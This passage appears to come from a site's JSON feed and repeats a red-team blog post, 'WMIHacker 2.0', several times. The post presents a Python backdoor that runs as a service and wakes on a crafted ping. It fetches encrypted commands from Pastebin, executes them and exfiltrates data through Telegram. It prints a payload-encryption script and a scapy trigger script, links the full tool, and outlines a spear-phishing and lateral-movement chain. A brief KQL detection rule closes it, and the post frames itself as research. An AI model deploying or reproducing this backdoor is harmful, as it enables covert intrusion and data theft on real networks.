node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code () is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous 